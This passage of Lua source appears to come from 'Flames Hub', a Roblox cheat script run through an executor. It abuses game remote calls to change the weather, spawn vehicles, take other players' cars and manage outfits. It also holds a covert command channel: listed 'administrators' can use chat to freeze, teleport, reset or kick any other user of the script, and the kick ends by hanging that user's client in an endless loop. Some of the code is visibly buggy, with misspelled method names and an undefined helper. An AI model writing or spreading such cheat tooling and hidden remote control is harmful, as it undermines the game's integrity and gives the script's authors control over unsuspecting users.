            }
         }
      elseif weather_set:lower():find("sun") then
         weather_args = {
            "change_weather",
            {
               humidity = 0.5,
               wind = 0.3,
               temperature = 1
            }
         }
      elseif weather_set:lower():find("rain") then
         weather_args = {
            "change_weather",
            {
               humidity = 1,
               wind = 0.7,
               temperature = 0.6
            }
         }
      end
      
      return weather_args
   end

   getgenv().set_new_weather = function(new_weather_input)
      if not is_localplayer_server_owner() then
         return notify("Error", "You are not the private server owner!", 5)
      end
      local changed_weather = getgenv().pick_new_weather(new_weather_input)
      if not changed_weather then
         return notify("Error", "Invalid weather type: " .. tostring(new_weather_input), 5)
      end
      getgenv().Send(unpack(changed_weather))
   end

   getgenv().weather_flasher_loop = function(toggle)
      if not is_localplayer_server_owner() then
         return notify("Error", "You are not the private server owner!", 5)
      end
      local fw = getgenv().FlamesLibrary.wait

      if toggle == true then
         if getgenv().changing_weather_on_repeat then
            return getgenv().notify("Warning", "Flames Hub - Weather Flasher is already enabled!", 5)
         end

         getgenv().changing_weather_on_repeat = true
         getgenv().notify("Success", "Flames Hub - Weather Flasher is now enabled.", 5)
         getgenv().FlamesLibrary.spawn("weather_loop_repeater", "spawn", function()
            while getgenv().changing_weather_on_repeat == true do
            fw(0)
               getgenv().set_new_weather("snow")
               fw(.1)
               getgenv().set_new_weather("rain")
               fw(0)
               getgenv().set_new_weather("sun")
            end
         end)
      elseif toggle == false then
         if not getgenv().changing_weather_on_repeat then
            return getgenv().notify("Warning", "Flames Hub - Weather Flasher is not enabled!", 5)
         end

         getgenv().changing_weather_on_repeat = false
         getgenv().FlamesLibrary.disconnect("weather_loop_repeater")
         getgenv().notify("Success", "Flames Hub - Weather Flasher is now disabled.", 5)
      else
         return 
      end
   end

   for _, name in ipairs(AllCars) do
      CarMap[name:lower()] = name
   end

   getgenv().car_listing_gui = function()
      if getgenv().CarListingGUIValue then
         return
      end
      
      getgenv().CarListingGUIValue = true

      local ScreenGui = Instance.new("ScreenGui")
      ScreenGui.Name = tostring(getgenv().randomString())
      ScreenGui.ResetOnSpawn = false
      ScreenGui.IgnoreGuiInset = true
      ScreenGui.Parent = parent_gui

      local MainFrame = Instance.new("Frame")
      MainFrame.Size = isMobile and UDim2.new(0, 280, 0, 350) or UDim2.new(0, 350, 0, 450)
      MainFrame.Position = UDim2.new(0.5, -MainFrame.Size.X.Offset/2, 0.5, -MainFrame.Size.Y.Offset/2)
      MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
      MainFrame.BorderSizePixel = 0
      MainFrame.Active = true
      MainFrame.Parent = ScreenGui

      local UICorner = Instance.new("UICorner")
      UICorner.CornerRadius = UDim.new(0, 15)
      UICorner.Parent = MainFrame

      local Title = Instance.new("TextLabel")
      Title.Size = UDim2.new(1, -40, 0, 40)
      Title.Position = UDim2.new(0, 10, 0, 0)
      Title.BackgroundTransparency = 1
      Title.Text = "Made by: "..tostring(Script_Creator)
      Title.Font = Enum.Font.GothamBold
      Title.TextSize = 18
      Title.TextColor3 = Color3.fromRGB(255, 255, 255)
      Title.TextXAlignment = Enum.TextXAlignment.Left
      Title.Parent = MainFrame

      local CloseButton = Instance.new("TextButton")
      CloseButton.Size = UDim2.new(0, 30, 0, 30)
      CloseButton.Position = UDim2.new(1, -35, 0, 5)
      CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
      CloseButton.Text = "X"
      CloseButton.Font = Enum.Font.GothamBold
      CloseButton.TextSize = 16
      CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
      CloseButton.Parent = MainFrame

      local CloseCorner = Instance.new("UICorner")
      CloseCorner.CornerRadius = UDim.new(0, 8)
      CloseCorner.Parent = CloseButton

      CloseButton.MouseButton1Click:Connect(function()
         ScreenGui:Destroy()
         getgenv().CarListingGUIValue = false
      end)

      local ScrollingFrame = Instance.new("ScrollingFrame")
      ScrollingFrame.Size = UDim2.new(1, -20, 1, -60)
      ScrollingFrame.Position = UDim2.new(0, 10, 0, 50)
      ScrollingFrame.BackgroundTransparency = 1
      ScrollingFrame.BorderSizePixel = 0
      ScrollingFrame.ScrollBarThickness = 6
      ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
      ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
      ScrollingFrame.Parent = MainFrame

      local UIListLayout = Instance.new("UIListLayout")
      UIListLayout.Parent = ScrollingFrame
      UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
      UIListLayout.Padding = UDim.new(0, 5)

      local UIPadding = Instance.new("UIPadding")
      UIPadding.Parent = ScrollingFrame
      UIPadding.PaddingLeft = UDim.new(0, 5)
      UIPadding.PaddingTop = UDim.new(0, 5)

      for _, name in ipairs(AllCars) do
         local CarButton = Instance.new("TextButton")
         CarButton.Size = UDim2.new(1, -10, 0, 30)
         CarButton.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
         CarButton.Text = name
         CarButton.Font = Enum.Font.Gotham
         CarButton.TextSize = 16
         CarButton.TextColor3 = Color3.fromRGB(220, 220, 220)
         CarButton.Parent = ScrollingFrame

         local CarCorner = Instance.new("UICorner")
         CarCorner.CornerRadius = UDim.new(0, 10)
         CarCorner.Parent = CarButton

         CarButton.MouseButton1Click:Connect(function()
            if not getgenv().Get then return end
            getgenv().Get("spawn_vehicle", name)
         end)
      end

      dragify(MainFrame)
   end

   getgenv().stop_all_anims = function()
      local Hum = getgenv().Humanoid or getgenv().Character:FindFirstChildOfClass("AnimationController") or getgenv().Character:FindFirstChildOfClass("Humanoid")
      if not Hum then return end
      for i,v in next, Hum:GetPlayingAnimationTracks() do
         v:Stop()
      end
   end

   getgenv().isTrackPlaying = function(humanoid)
      if not humanoid then
         notify("Error", "Humanoid does not exist / was not found.", 6)
         return false
      end

      for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
         if track.IsPlaying or (track.TimePosition > 0 and track.Length > 0) then
            return true
         end
      end

      return false
   end
   fw(0.2)
   getgenv().main_emote_ID = 72074295131591
   getgenv().play_anim_on_local_plr = function(anim_selector)
      if anim_selector == "1" then
         if getgenv().isTrackPlaying(Humanoid) then
            getgenv().stop_all_anims()
         end
         fw(0.2)
         local Humanoid = getgenv().Humanoid or getgenv().Character:FindFirstChildOfClass("AnimationController")
         local anim = Instance.new("Animation")
         anim.AnimationId = "rbxassetid://134313829527772"
         fw(0.1)
         local track = Humanoid:LoadAnimation(anim)
         track:Play(0, 1, 1)
         track.TimePosition = 3.2708375453948975
         track:AdjustSpeed(0)

         for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
            v:AdjustSpeed(0)
         end
      elseif anim_selector == "2" then
         if getgenv().isTrackPlaying(Humanoid) then
            getgenv().stop_all_anims()
         end
         fw(0.2)
         local Humanoid = getgenv().Humanoid or getgenv().Character:FindFirstChildOfClass("AnimationController")
         local anim = Instance.new("Animation")
         anim.AnimationId = "rbxassetid://119055944394046"
         fw(0.1)
         local track = Humanoid:LoadAnimation(anim)
         track:Play(0, 1, 1)
      elseif anim_selector == "3" then
         if getgenv().isTrackPlaying(Humanoid) then
            getgenv().stop_all_anims()
         end
         fw(0.2)
         local Humanoid = getgenv().Humanoid or getgenv().Character:FindFirstChildOfClass("AnimationController")
         local anim = Instance.new("Animation")
         anim.AnimationId = "rbxassetid://137126647656632"
         fw(0.1)
         local track = Humanoid:LoadAnimation(anim)
         track:Play(0, 1, 1)

         for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
            v:AdjustSpeed(0)
         end
      elseif anim_selector == "4" then
         if getgenv().isTrackPlaying(Humanoid) then
            getgenv().stop_all_anims()
         end
         fw(0.2)
         local Humanoid = getgenv().Humanoid or getgenv().Character:FindFirstChildOfClass("AnimationController")
         local anim = Instance.new("Animation")
         anim.AnimationId = "rbxassetid://85233258054867"
         fw(0.1)
         local track = Humanoid:LoadAnimation(anim)
         track:Play(0, 1, 1)

         for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
            v:AdjustSpeed(0)
         end
      elseif anim_selector == "5" then
         if getgenv().isTrackPlaying(Humanoid) then
            getgenv().stop_all_anims()
         end
         fw(0.2)
         local Humanoid = getgenv().Humanoid or getgenv().Character:FindFirstChildOfClass("AnimationController")
         local anim = Instance.new("Animation")
         anim.AnimationId = "rbxassetid://74284205097179"
         fw(0.1)
         local track = Humanoid:LoadAnimation(anim)
         track:Play(0, 1, 1)

         for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
            v:AdjustSpeed(0)
         end
      elseif anim_selector == "6" then
         if getgenv().isTrackPlaying(Humanoid) then
            getgenv().stop_all_anims()
         end
         fw(0.2)
         local Humanoid = getgenv().Humanoid or getgenv().Character:FindFirstChildOfClass("AnimationController")
         local anim = Instance.new("Animation")
         anim.AnimationId = "rbxassetid://107168210393534"
         fw(0.1)
         local track = Humanoid:LoadAnimation(anim)
         track:Play(0, 1, 1)

         for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
            v:AdjustSpeed(0)
         end
      else
         return notify("Error", "Invalid Animation argument provided, pick between either 1 or 2.", 7)
      end
   end

   getgenv().create_bindable = function()
      if getgenv()._localBindable then
         return getgenv()._localBindable
      end

      local b = Instance.new("BindableEvent")
      getgenv()._localBindable = b
      return b
   end

   getgenv().is_me = function(input)
      if type(input) ~= "string" then return false end

      input = string.lower(input)
      local name = string.lower(LocalPlayer.Name)
      local display = string.lower(LocalPlayer.DisplayName)

      return name:sub(1, #input) == input or display:sub(1, #input) == input
   end

   local Bindable
   if not allowed[LocalPlayer.Name] then
      Bindable = create_bindable()
   end

   if allowed[LocalPlayer.Name] then
      notify("Success", "You're an Administrator/Staff in Flames Hub, you can do our PRIVATE commands by doing: ?flamescmds in the chat.", 15)
   end

   local commands = {
      ["!anim"] = {
         display = "!anim [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            getgenv().play_anim_on_local_plr("1")
         end
      },

      ["!reset"] = {
         display = "!reset [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            if getgenv().Humanoid then
               pcall(function() getgenv().Humanoid.Health = 0 end)
            elseif not getgenv().Humanoid or not getgenv().Humanoid.Parent then
               repeat task.wait(10) until getgenv().Character:FindFirstChildOfClass("Humanoid")
               wait(1)
               if getgenv().Character:FidnFirstChildOfClass("Humanoid") then
                  getgenv().Character:FidnFirstChildOfClass("Humanoid").Health = 0
               end
            end
         end
      },

      ["!speed"] = {
         display = "!speed [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            if getgenv().Humanoid then pcall(function() getgenv().Humanoid.WalkSpeed = 100 end) end
         end
      },

      ["!anim2"] = {
         display = "!anim2 [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            getgenv().play_anim_on_local_plr("2")
         end
      },

      ["!anim3"] = {
         display = "!anim3 [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            getgenv().play_anim_on_local_plr("3")
         end
      },

      ["!anim4"] = {
         display = "!anim4 [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            getgenv().play_anim_on_local_plr("4")
         end
      },

      ["!anim5"] = {
         display = "!anim5 [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            getgenv().play_anim_on_local_plr("5")
         end
      },

      ["!anim6"] = {
         display = "!anim6 [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            getgenv().play_anim_on_local_plr("6")
         end
      },

      ["!jump"] = {
         display = "!jump [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            if getgenv().Humanoid and getgenv().HumanoidRootPart then
               pcall(function()
                  getgenv().HumanoidRootPart.Anchored = true
                  wait(0.3)
                  getgenv().Humanoid:ChangeState(3)
                  wait(0.3)
                  getgenv().HumanoidRootPart.Anchored = false
               end)
            end
         end
      },

      ["!freeze"] = {
         display = "!freeze [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            if getgenv().HumanoidRootPart then pcall(function() getgenv().HumanoidRootPart.Anchored = true end) end
         end
      },

      ["!unfreeze"] = {
         display = "!unfreeze [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            if getgenv().HumanoidRootPart then pcall(function() getgenv().HumanoidRootPart.Anchored = false end) end
         end
      },

      ["!kick"] = {
         display = "!kick [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            getgenv().LocalPlayer:Kick("The owner of Flames Hub or an official Administrator/Staff of Flames Hub has kicked you.")
            wait(3)
            while true do end
         end
      },

      ["!bring"] = {
         display = "!bring [player]",
         run = function(args, sender)
            local target = args[2]
            if not is_me(target) then return end
            if not sender then return end
            local sender_char = sender.Character
            local sender_hrp = sender_char:WaitForChild("HumanoidRootPart")
            if sender_char and sender_char:FindFirstChild("HumanoidRootPart") then
               pcall(function()
                  if getgenv().HumanoidRootPart and getgenv().Character:FindFirstChild("HumanoidRootPart") then
                     getgenv().HumanoidRootPart.CFrame = CFrame.new(sender_hrp.Position + Vector3.new(0, 3, 0))
                     getgenv().Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(sender_hrp.Position + Vector3.new(0, 3, 0))
                  else
                     getgenv().Character:PivotTo(sender_char:GetPivot() + Vector3.new(0, 3, 0))
                  end
               end)
            end
         end
      },

      ["!unanim"] = {
         display = "!unanim [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            getgenv().stop_all_anims()
         end
      },

      ["!unemote"] = {
         display = "!unemote [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            getgenv().stop_all_anims()
         end
      },

      ["!stopanims"] = {
         display = "!stopanims [player]",
         run = function(args)
            local target = args[2]
            if not is_me(target) then return end
            getgenv().stop_all_anims()
         end
      }
   }

   getgenv().run_command = function(cmdName, args, sender)
      local data = commands[cmdName]

      if data then
         data.run(args, sender)
      end
   end

   getgenv().commands_menu_for_administrators_and_staffs = function()
      if getgenv().CommandsMenuGui and getgenv().CommandsMenuGui:IsA("ScreenGui") then
         getgenv().CoreGui:FindFirstChild("CommandsMenu").Enabled = true
         return 
      end
      fw(0.1)
      local Commands_Menu_For_Administration_Listing = Instance.new("ScreenGui")
      Commands_Menu_For_Administration_Listing.Name = "CommandsMenu"
      Commands_Menu_For_Administration_Listing.ResetOnSpawn = false
      Commands_Menu_For_Administration_Listing.Parent = CoreGui or getgenv().CoreGui

      local MainFrame = Instance.new("Frame")
      MainFrame.Name = "MainFrame"
      MainFrame.Size = UDim2.new(0, 300, 0, 400)
      MainFrame.Position = UDim2.new(0.5, -150, 0.5, -200)
      MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
      MainFrame.BorderSizePixel = 0
      MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
      MainFrame.Parent = Commands_Menu_For_Administration_Listing
      wait(0.45)
      dragify(MainFrame)
      getgenv().CommandsMenuGui = Commands_Menu_For_Administration_Listing

      local Subtitle = Instance.new("TextLabel")
      Subtitle.Name = "Subtitle"
      Subtitle.Size = UDim2.new(1, -10, 0, 20)
      Subtitle.Position = UDim2.new(0, 5, 0, 35)
      Subtitle.BackgroundTransparency = 1
      Subtitle.Text = "Commands only work on other Flames Hub users."
      Subtitle.TextColor3 = Color3.fromRGB(180, 180, 180)
      Subtitle.TextScaled = true
      Subtitle.Font = Enum.Font.Gotham
      Subtitle.TextWrapped = true
      Subtitle.Parent = MainFrame

      local UICorner = Instance.new("UICorner")
      UICorner.CornerRadius = UDim.new(0, 10)
      UICorner.Parent = MainFrame

      local Title = Instance.new("TextLabel")
      Title.Name = "Title"
      Title.Size = UDim2.new(1, -10, 0, 30)
      Title.Position = UDim2.new(0, 5, 0, 5)
      Title.BackgroundTransparency = 1
      Title.Text = "Commands Menu"
      Title.TextColor3 = Color3.fromRGB(255, 255, 255)
      Title.TextScaled = true
      Title.Font = Enum.Font.GothamBold
      Title.Parent = MainFrame

      local CloseButton = Instance.new("TextButton")
      CloseButton.Name = "CloseButton"
      CloseButton.Size = UDim2.new(0, 25, 0, 25)
      CloseButton.Position = UDim2.new(1, -30, 0, 5)
      CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
      CloseButton.Text = "X"
      CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
      CloseButton.Font = Enum.Font.GothamBold
      CloseButton.TextScaled = true
      CloseButton.Parent = MainFrame
      CloseButton.MouseButton1Click:Connect(function()
         Commands_Menu_For_Administration_Listing.Enabled = false
      end)
      wait(0.5)
      make_round(CloseButton)

      local ScrollFrame = Instance.new("ScrollingFrame")
      ScrollFrame.Name = "ScrollFrame"
      ScrollFrame.Position = UDim2.new(0, 5, 0, 65)
      ScrollFrame.Size = UDim2.new(1, -10, 1, -75)
      ScrollFrame.BackgroundTransparency = 1
      ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
      ScrollFrame.ScrollBarThickness = 6
      ScrollFrame.Parent = MainFrame

      local UIListLayout = Instance.new("UIListLayout")
      UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
      UIListLayout.Padding = UDim.new(0, 5)
      UIListLayout.Parent = ScrollFrame

      for _, data in pairs(commands) do
         local Label = Instance.new("TextLabel")
         Label.Size = UDim2.new(1, -10, 0, 30)
         Label.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
         Label.TextColor3 = Color3.fromRGB(255, 255, 255)
         Label.Text = data.display
         Label.Font = Enum.Font.Gotham
         Label.TextScaled = true
         Label.TextWrapped = true
         Label.Parent = ScrollFrame

         local LabelCorner = Instance.new("UICorner")
         LabelCorner.CornerRadius = UDim.new(0, 5)
         LabelCorner.Parent = Label
      end

      UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
         ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 5)
      end)
   end

   if not getgenv().Message_Received_Conn_Owner_Commands_Setup then
      TextChatService.MessageReceived:Connect(function(message)
         local source = message.TextSource
         if not source then return end
         local sender = Players:GetPlayerByUserId(source.UserId)
         if not sender or not allowed[sender.Name] then return end
         local text = message.Text
         if type(text) ~= "string" or text == "" then return end
         local args = text:split(" ")
         local cmdName = string.lower(args[1])
         local data = commands[cmdName]

         if data then
            data.run(args, sender)
         end
      end)
      fw(0.1)
      getgenv().Message_Received_Conn_Owner_Commands_Setup = true
   end

   if not getgenv().Administrator_Staff_Message_Received_Commands_Section then
      TextChatService.MessageReceived:Connect(function(message)
         local source = message.TextSource
         if not source then return end

         local sender = Players:GetPlayerByUserId(source.UserId)
         if not sender then return end
         if sender ~= LocalPlayer then return end
         if not allowed[sender.Name] then return end
         local text = message.Text
         if type(text) ~= "string" or text == "" then return end
         if text == "?flamescmds" then
            getgenv().commands_menu_for_administrators_and_staffs()
         end
      end)
      fw(0.1)
      getgenv().Administrator_Staff_Message_Received_Commands_Section = true
   end

   if Bindable then
      Bindable.Event:Connect(function(cmdName, args)
         if type(cmdName) ~= "string" or type(args) ~= "table" then return end
         run_command(cmdName, args, nil)
      end)
   end

   if getgenv().get_enrolled_state == nil then
      notify("Info", "Waiting until getgenv().get_enrolled_state exists...", 6)
      repeat task.wait() until getgenv().get_enrolled_state and getgenv().get_enrolled_state ~= nil
      if getgenv().get_enrolled_state then
         notify("Success", "Found get_enrolled_state correctly.", 5)
      end
   end

   if CoreGui:FindFirstChild("FlamesAdminGUI", true) and CoreGui:FindFirstChild("FlamesAdminGUI", true):IsA("ScreenGui") then
      CoreGui:FindFirstChild("FlamesAdminGUI", true).Enabled = true
   end

   getgenv().get_other_vehicle = getgenv().get_other_vehicle or function(Player)
      for _, v in pairs(getgenv().Workspace:FindFirstChild("Vehicles"):GetChildren()) do
         local owner_object = v:FindFirstChild("owner") or v:FindFirstChild("owner", true)

         if owner_object and owner_object.Value == Player then
            return v
         end
      end

      return nil
   end

   local RGB_KEY = "rgb_phone_loop"
   getgenv().change_phone_color = function(New_Color)
      getgenv().Send("phone_color", New_Color)
   end

   getgenv().RGB_Phone = function(Boolean)
      local lib = getgenv().FlamesLibrary
      local colors = {
         Color3.fromRGB(255, 255, 255),
         Color3.fromRGB(128, 128, 128),
         Color3.fromRGB(0, 0, 0),
         Color3.fromRGB(0, 0, 255),
         Color3.fromRGB(0, 255, 0),
         Color3.fromRGB(0, 255, 255),
         Color3.fromRGB(255, 165, 0),
         Color3.fromRGB(139, 69, 19),
         Color3.fromRGB(255, 255, 0),
         Color3.fromRGB(50, 205, 50),
         Color3.fromRGB(255, 0, 0),
         Color3.fromRGB(255, 155, 172),
         Color3.fromRGB(128, 0, 128),
      }

      if Boolean == true then
         if getgenv().RGB_Rainbow_Phone then
               return notify("Warning", "RGB/Rainbow Phone is already enabled.", 5)
         end

         getgenv().RGB_Rainbow_Phone = true
         getgenv().notify("Success", "Started RGB/Rainbow Phone.", 5)
         lib.spawn(RGB_KEY, "spawn", function()
            while getgenv().RGB_Rainbow_Phone == true do
               for _, color in ipairs(colors) do
                  if getgenv().RGB_Rainbow_Phone ~= true then return end
                  getgenv().change_phone_color(color)
                  fw(0)
               end
            end
         end)
      elseif Boolean == false then
         if not getgenv().RGB_Rainbow_Phone then
            return notify("Warning", "RGB/Rainbow Phone is not enabled.", 5)
         end

         getgenv().RGB_Rainbow_Phone = false
         lib.disconnect(RGB_KEY)
         notify("Success", "Stopped RGB/Rainbow Phone.", 5)
         fw(0.1)
         getgenv().change_phone_color(Color3.fromRGB(255, 255, 255))
      end
   end

   getgenv().steal_car_functionality = function(target_plr)
      local selected_player = nil

      if typeof(target_plr) == "Instance" and target_plr:IsA("Player") then
         selected_player = target_plr
      elseif typeof(target_plr) == "string" then
         for _, plr in pairs(getgenv().Players:GetPlayers()) do
            if plr.Name == target_plr then
               selected_player = plr
               break
            end
         end
      end

      if not selected_player then return end

      for _, vehicle in pairs(getgenv().Workspace:FindFirstChild("Vehicles"):GetChildren()) do
         local seat = vehicle:FindFirstChild("VehicleSeat") or vehicle:FindFirstChild("VehicleSeat", true)
         if not seat then return notify("Error", "We could not find VehicleSeat in this Vehicle.", 6) end

         local owner_object = vehicle:FindFirstChild("owner")
         if not owner_object then return notify("Error", "No 'owner' object found in this Vehicle.", 6) end

         if owner_object.Value == selected_player then
            if seat.Occupant == nil and vehicle:GetAttribute("locked") == false then
               local ok, response = pcall(function()
                  getgenv().Get("sit", seat)
               end)
               if not ok and getgenv().notify then
                  notify("Error", tostring(response), 15)
               end
               break
            else
               notify("Error", "Someone is already in this Vehicle, try again when they are not sitting in it.", 8)
               break
            end
         end
      end
   end

   getgenv().save_outfits_GUI = function()
      if CoreGui:FindFirstChild("OutfitManagerUI", true) then
         return notify("Warning", "You're already running Outfits Manager!", 5)
      end
      if getgenv().LoadedOutfit_Manager_GUI then
         return notify("Warning", "You're already running Outfits Manager!", 5)
      end

      local Send, Get = getgenv().Send, getgenv().Get
      local FolderName = "lifetogether_admin_savedoutfits"
      local ui_refs = {}
      if not isfolder(FolderName) then makefolder(FolderName) end

      local function getOutfitFiles()
         local files = {}
         for _, f in ipairs(listfiles(FolderName)) do
            if f:match("%.json$") then
               table.insert(files, f)
            end
         end
         return files
      end

      local function readOutfitData(file)
         local ok, content = pcall(readfile, file)
         if ok and content and #content > 0 then
            local success, data = pcall(function() return HttpService:JSONDecode(content) end)
            if success and type(data) == "table" then
               return data
            end
         end
         return {}
      end

      local function writeOutfitData(name, data)
         if not name or name == "" then return end
         local path = FolderName .. "/" .. name .. ".json"
         writefile(path, HttpService:JSONEncode(data))
      end

      local function deleteOutfit(name)
         if not delfile then return end
         local path = FolderName .. "/" .. name .. ".json"
         if isfile(path) then
            delfile(path)
         end
      end

      local function clearAvatar()
         local Humanoid = getgenv().Humanoid or (getgenv().Character and getgenv().Character:FindFirstChildOfClass("Humanoid"))
         if not Humanoid then return false end
         local desc = Humanoid:GetAppliedDescription()
         if not desc then return false end

         for _, anim in ipairs({"Idle","Run","Walk","Jump","Fall","Climb","Swim"}) do
            pcall(function()
               getgenv().Get("wear", 0, anim.."Animation")
            end)
            task.wait(0.4)
         end

         for _, acc in ipairs(desc:GetAccessories(true)) do
            pcall(function()
               getgenv().Get("wear", acc.AssetId, acc.AccessoryType.Name.."Accessory")
            end)
            task.wait(0.4)
         end

         for _, part in ipairs({"Head","Torso","LeftArm","RightArm","LeftLeg","RightLeg","Face","Shirt","Pants","GraphicTShirt"}) do
            local id = desc[part]
            if id and id > 0 then
               pcall(function()
                  getgenv().Get("wear", id, part)
               end)
               task.wait(0.4)
            end
         end

         pcall(function()
            getgenv().Send("body_scale", "HeightScale", 100)
            fw(0.2)
            getgenv().Send("body_scale", "WidthScale", 100)
         end)

         task.wait(0.5)
         return true
      end

      local function getAvatarAssets(player)
         if not player.Character then return {}, nil, nil, nil, nil, nil end
         local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
         if not humanoid then return {}, nil, nil, nil, nil, nil end
         local desc = humanoid:GetAppliedDescription()

         local assets = {}
         for _, acc in ipairs(desc:GetAccessories(true)) do
            if acc.AssetId and acc.AssetId > 0 then
               table.insert(assets, {id = acc.AssetId, type = acc.AccessoryType.Name .. "Accessory"})
            end
         end
         if desc.Shirt > 0 then table.insert(assets, {id = desc.Shirt, type = "Shirt"}) end
         if desc.Pants > 0 then table.insert(assets, {id = desc.Pants, type = "Pants"}) end
         if desc.GraphicTShirt > 0 then table.insert(assets, {id = desc.GraphicTShirt, type = "TShirt"}) end
         if desc.Face > 0 then table.insert(assets, {id = desc.Face, type = "Face"}) end
         for _, part in ipairs({"Head","Torso","LeftArm","RightArm","LeftLeg","RightLeg"}) do
            if desc[part] and desc[part] > 0 then table.insert(assets, {id = desc[part], type = part}) end
         end

         local anims = {"Fall","Walk","Run","Jump","Idle","Climb","Swim"}
         local animData = {}
         for _, anim in ipairs(anims) do
            local id = desc[anim.."Animation"]
            if id and id > 0 then table.insert(animData, {id=id,type=anim.."Animation"}) end
         end

         local skinTone = desc.HeadColor or Color3.new(1,1,1)
         local height = desc.HeightScale or 1
         local width = desc.WidthScale or 1
         local age = player:GetAttribute("age")

         return assets, skinTone, height, width, animData, age
      end

      local function wearAssets(tbl)
         for _, data in ipairs(tbl) do
            pcall(function() Get("wear", data.id, data.type) end)
            task.wait(0.25)
         end
      end

      local function promptOutfitName(callback)
         local popup = Instance.new("ScreenGui")
         popup.Name = "OutfitNamePrompt"
         popup.IgnoreGuiInset = true
         popup.ResetOnSpawn = false
         popup.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
         popup.Parent = parent_gui

         local frame = Instance.new("Frame")
         frame.Size = UDim2.new(0, 250, 0, 130)
         frame.Position = UDim2.new(0.5, -125, 0.5, -65)
         frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
         frame.Parent = popup
         Instance.new("UICorner", frame)

         local title = Instance.new("TextLabel")
         title.Size = UDim2.new(1, -10, 0, 30)
         title.Position = UDim2.new(0, 5, 0, 5)
         title.BackgroundTransparency = 1
         title.Text = "Enter Outfit Name"
         title.TextColor3 = Color3.new(1, 1, 1)
         title.Font = Enum.Font.GothamBold
         title.TextScaled = true
         title.Parent = frame

         local txt = Instance.new("TextBox")
         txt.PlaceholderText = "Outfit Name"
         txt.Size = UDim2.new(1, -20, 0, 35)
         txt.Position = UDim2.new(0, 10, 0, 40)
         txt.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
         txt.TextColor3 = Color3.new(1, 1, 1)
         txt.Font = Enum.Font.Gotham
         txt.TextScaled = true
         txt.ClearTextOnFocus = true
         txt.Text = ""
         txt.Parent = frame
         Instance.new("UICorner", txt)

         local save_btn = Instance.new("TextButton")
         save_btn.Size = UDim2.new(1, -20, 0, 35)
         save_btn.Position = UDim2.new(0, 10, 0, 85)
         save_btn.Text = "Save"
         save_btn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
         save_btn.TextColor3 = Color3.new(1, 1, 1)
         save_btn.Font = Enum.Font.GothamBold
         save_btn.TextScaled = true
         save_btn.Parent = frame
         Instance.new("UICorner", save_btn)

         save_btn.MouseButton1Click:Connect(function()
            local name = txt.Text:gsub("%s+", "")
            if name ~= "" then
               popup:Destroy()
               task.wait()
               callback(name)
            else
               g.notify("Error", "Enter a valid outfit name.", 5)
            end
         end)
      end

      local function fuzzy_match(name, query)
         local j = 1
         local qlen = #query

         for i = 1, #name do
            if name:sub(i, i) == query:sub(j, j) then
               j = j + 1
               if j > qlen then
                  return true
               end
            end
         end

         return false
      end

      local function refreshOutfitList()
         local scroller = ui_refs.scroller
         if not scroller then return g.notify("Warning", "Scroller missing from UI.", 5) end

         local query = ""
         if ui_refs.searchbox then
            query = string.lower(ui_refs.searchbox.Text or "")
         end

         for _, child in ipairs(scroller:GetChildren()) do
            if child:IsA("Frame") then
               child:Destroy()
            end
         end

         for _, file in ipairs(getOutfitFiles()) do
            local name = file:match("([^/\\]+)%.json$")
            local lowered_name = string.lower(name)

            if query ~= "" then
               local exact_match = string.find(lowered_name, query, 1, true)
               local fuzzy_match_result = fuzzy_match(lowered_name, query)

               if not exact_match and not fuzzy_match_result then
                  -- [[ do nothing ]] --
               end
            end

            local entry = Instance.new("Frame")
            entry.Size = UDim2.new(1,-5,0,35)
            entry.BackgroundColor3 = Color3.fromRGB(35,35,35)
            entry.Parent = scroller
            Instance.new("UICorner", entry)

            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(0.349999994, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = name
            label.TextColor3 = Color3.new(1,1,1)
            label.Font = Enum.Font.Gotham
            label.TextScaled = true
            label.Parent = entry

            local wearBtn = Instance.new("TextButton")
            wearBtn.Size = UDim2.new(0.25, -30, 1, -10)
            wearBtn.Position = UDim2.new(0.5, 40, 0, 7)
            wearBtn.Text = "💾 Wear 💾"
